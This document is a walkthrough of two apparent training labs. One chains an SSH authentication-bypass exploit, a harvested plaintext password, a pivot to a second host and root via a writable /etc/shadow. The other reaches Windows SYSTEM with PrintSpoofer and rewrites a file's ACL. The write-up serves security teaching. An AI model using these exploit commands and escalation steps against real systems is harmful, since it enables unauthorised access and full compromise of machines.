# Lab Walkthrough - SSH Exploitation to Privilege Escalation

## 🧠 Lab Overview

You were given two machines:

* `target1.ine.local`
* `target2.ine.local`

The goal was to capture 5 flags by:

1. Exploiting SSH
2. Enumerating Linux configuration files
3. Finding credentials
4. Pivoting to another host
5. Escalating privileges

---

## 🔓 Initial Access – target1 (SSH Auth Bypass)

You were given an SSH exploit script (`46307.py`) that abuses SSH authentication state by sending a fake:

```
SSH_MSG_USERAUTH_SUCCESS
```

If the SSH server is vulnerable, it allows opening a session without authentication.

You ran:

```bash
python3 46307.py target1.ine.local 22 "cat /etc/passwd"
```

It worked → meaning SSH on target1 was vulnerable.

**You now had remote command execution (RCE).**

---

## 🏁 Flag 1

**Clue:**  
*The file that stores user account details is worth a closer look.*

That file is:

```bash
/etc/passwd
```

You saw:

```
FLAG1_266f5d93fcd64a27a4029644d47705bc
```

✅ **Flag 1 captured.**

---

## 🏁 Flag 2

**Clue:**  
*User groups might reveal more than you expect.*

You checked:

```bash
cat /etc/group
```

At the bottom, you found:

```
# FLAG2_77790603b1d1466b91ef0039412eab9f
```

CTF intentionally hid it in group file comments.

✅ **Flag 2 captured.**

---

## 🏁 Flag 3

**Clue:**  
*Scheduled tasks often have telling names.*

You enumerated cron jobs:

```bash
ls -la /etc/cron*
```

Inside `/etc/cron.d/`:

```
FLAG3_b7f35701fdfd4177b4d9f12e7658df52
```

The filename itself was the flag.

✅ **Flag 3 captured.**

---

## 🏁 Flag 4

**Clue:**  
*DNS configurations might point you in the right direction. Also, explore the home directories for stored credentials.*

You checked:

```bash
cat /etc/hosts
```

You found:

```
#FLAG4_33cc98ba895b4ce1a6585b8137c1fd00
```

You also discovered:

```
192.168.157.3 target2.ine.local
```

This revealed the second machine.

Then you explored:

```bash
ls -la /home/user
```

You found:

```
credentials.txt
```

Inside:

```
john:Pass@john123
```

This gave you valid credentials for pivoting.

✅ **Flag 4 captured.**

---

## 🔁 Lateral Movement – target2

You SSH'd into target2:

```bash
ssh john@target2.ine.local
```

Password:

```
Pass@john123
```

**Login successful.**

---

## 🔍 Privilege Escalation Enumeration (target2)

You checked:

```bash
sudo -l
```

→ Not installed.

You checked SUID:

```bash
find / -perm 4000 2>/dev/null
```

→ Nothing useful.

You checked groups:

```bash
id
```

→ No special groups.

You checked root directory:

```bash
ls -ld /root
```

→ Properly protected.

Then you searched for world-writable files:

```bash
find / -type f -perm -0002 2>/dev/null
```

You discovered:

```
/etc/shadow was writable
```

**That is catastrophic misconfiguration.**

---

## 🔥 Final Privilege Escalation

Since `/etc/shadow` stores password hashes and was writable, you could modify root's password.

You generated a hash:

```bash
openssl passwd -1 -salt abc password
```

Output:

```
$1$abc$BXBqpb9BZcZhXLgbee.0s/
```

You edited `/etc/shadow`:  
Changed root's hash to your generated one.

Then:

```bash
su root
```

Password:

```
password
```

**You became root.**

---

## 🏁 Flag 5

Inside `/root`:

```bash
cat flag.txt
```

You got:

```
FLAG5_5c2237bf4761449387373aaded200560
```

✅ **Flag 5 captured.**

---

## 🧠 Complete Attack Chain Summary

1. Exploited SSH auth bypass on target1
2. Enumerated system configuration files
3. Extracted hidden flags
4. Found stored credentials
5. Pivoted to target2
6. Enumerated privilege escalation vectors
7. Found writable `/etc/shadow`
8. Injected new root password hash
9. Escalated to root
10. Retrieved final flag

This was a full red-team style chain:

* **Initial Access**
* **Enumeration**
* **Credential Harvesting**
* **Lateral Movement**
* **Privilege Escalation**
* **Root Compromise**

---

## 🎓 What This Lab Taught You

* SSH protocol exploitation
* Linux system file enumeration
* Importance of `/etc/passwd`, `/etc/group`, `/etc/hosts`
* Cron job reconnaissance
* Credential reuse
* Shadow file exploitation
* Password hash formats (`$1$`, `$6$`)
* How Linux authentication works
* Full attack workflow logic

---
---
# Lab 2 Walkthrough – Windows Privilege Escalation

## 🎯 Objective

Gain SYSTEM privileges and retrieve the Administrator flag.

---

## 1️⃣ Initial Access

We had access as a low-privileged user:

```
win-gq7ptvec6hl\david
```

We verified this with:

```cmd
whoami
```

Output:

```
win-gq7ptvec6hl\david
```

**So we are NOT admin.**

---

## 2️⃣ Check Privileges

Next step in any Windows privesc:

```cmd
whoami /priv
```

Important output:

```
SeImpersonatePrivilege    Enabled
```

🚨 **This is critical.**

### 🧠 Why SeImpersonatePrivilege Is Important

If this privilege is enabled, we can:

* Impersonate higher-privileged tokens
* Abuse Windows services
* Escalate to SYSTEM

**This is one of the most common Windows privilege escalation paths.**

---

## 3️⃣ Identify Windows Version

We checked:

```cmd
ver
```

Output:

```
Microsoft Windows [Version 6.3.9600]
```

That's:

* Windows 8.1
* Windows Server 2012 R2

These are vulnerable to token impersonation exploits like:

* PrintSpoofer
* JuicyPotato

---

## 4️⃣ Upload Exploit (PrintSpoofer)

We uploaded:

```
PrintSpoofer64.exe
```

Using SCP.

Then executed:

```cmd
PrintSpoofer64.exe -i -c cmd
```

**Explanation:**

* `-i` → interactive
* `-c cmd` → spawn new cmd shell

---

## 5️⃣ Verify Escalation

In the new shell:

```cmd
whoami
```

Output:

```
nt authority\system
```

🎉 **We are now SYSTEM.**

Equivalent of "root" in Windows.

---

## 6️⃣ Attempt to Access Flag

We navigated to:

```cmd
C:\Users\Administrator
```

Saw a folder:

```
flag
```

But when trying:

```cmd
cd flag
```

We got:

```
Access is denied.
```

**Even as SYSTEM.**

---

## 7️⃣ Investigate ACL Permissions

We checked permissions:

```cmd
icacls C:\Users\Administrator\flag
```

Output showed:

```
SYSTEM:(DENY)(RX)
```

**This is important.**

### 🧠 Why SYSTEM Was Blocked

**Windows ACL rules:**

❗ **DENY always overrides ALLOW.**

Even though SYSTEM had Full Control, there was an explicit DENY entry.

So access was blocked.

**This was an intentional trap in the lab.**

---

## 8️⃣ Fix the ACL

Since we are SYSTEM, we can modify permissions.

We removed the deny rule:

```cmd
icacls C:\Users\Administrator\flag /remove:d SYSTEM
```

Then granted full control:

```cmd
icacls C:\Users\Administrator\flag /grant SYSTEM:F
```

---

## 9️⃣ Access the Flag

Now:

```cmd
cd C:\Users\Administrator\flag
dir
type flag.txt
```

**And we successfully retrieved the flag.**

---

## 🔥 What This Lab Taught

### 1️⃣ Always Enumerate Privileges

`whoami /priv` is critical.

### 2️⃣ SeImpersonatePrivilege = Huge Opportunity

Very common privesc path.

### 3️⃣ SYSTEM ≠ Unlimited Access

ACL rules still apply.

### 4️⃣ DENY Overrides ALLOW

Windows permission precedence matters.

### 5️⃣ Think Before Switching Users

Instead of switching to Administrator, we fixed the permission directly.

---

## 🏆 Attack Chain Summary

1. Low-privileged user (david)
2. Found SeImpersonatePrivilege enabled
3. Identified vulnerable Windows version
4. Uploaded PrintSpoofer
5. Escalated to SYSTEM
6. Encountered ACL deny trap
7. Modified ACL
8. Retrieved Administrator flag

---

## 💡 Key Takeaways for Juniors

When doing Windows privilege escalation:

1. Run:

```cmd
whoami /priv
```

2. If SeImpersonatePrivilege is enabled:  
   → Try PrintSpoofer or JuicyPotato.

3. If access denied:  
   → Check ACL with `icacls`

4. Remember:
   * DENY overrides ALLOW
   * SYSTEM is powerful, but ACLs still matter

---

## 🎓 Real-World Relevance

This is not just CTF logic.

In real pentests:

* SeImpersonatePrivilege abuse is extremely common
* Many enterprise systems are misconfigured
* Token impersonation is a serious attack vector

**You just performed a real-world style privilege escalation.**
